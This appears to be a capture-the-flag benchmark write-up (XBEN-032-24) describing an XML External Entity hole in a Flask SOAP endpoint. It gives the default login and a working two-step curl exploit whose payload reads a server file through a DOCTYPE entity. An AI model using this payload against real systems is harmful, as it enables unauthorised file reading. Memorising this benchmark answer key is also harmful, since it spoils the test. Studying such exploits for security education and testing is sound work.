# XBEN-032-24 — Nice SOAP

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** XML External Entity (XXE) injection in a Flask SOAP endpoint, reached after logging in with documented default credentials.

## Summary

`app/app.py` implements `/soap_service`, which parses the raw POST body with:

```python
parser = etree.XMLParser(resolve_entities=True)
root = etree.fromstring(xml_data, parser)
```

`resolve_entities=True` (the `lxml` default/explicit setting here) means any `<!ENTITY ... SYSTEM "...">` declared in a `DOCTYPE` is resolved and its value substituted into the parsed tree. The `account_id` value pulled from the request (`root.find('.//account_id').text`) is then reflected verbatim back into the SOAP XML response — so declaring an external entity pointing at `file:///app/flag.txt` and referencing it as the `account_id` value causes the file's contents to be read server-side and echoed straight back in the HTTP response.

The endpoint sits behind `@login_required` (Flask session cookie), but the challenge description supplies valid credentials (`john` / `password123`) defined in-source (`users = {'john': 'password123'}`).

## Exploit

```bash
# 1. Authenticate with the documented default credentials to obtain a session cookie
curl -s -c cookies032.txt -X POST http://localhost:63691/login \
  -d "username=john&password=password123"

# 2. Send an XXE payload as the SOAP request body
curl -s -b cookies032.txt -X POST http://localhost:63691/soap_service \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE GetAccountInfoRequest [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'
```
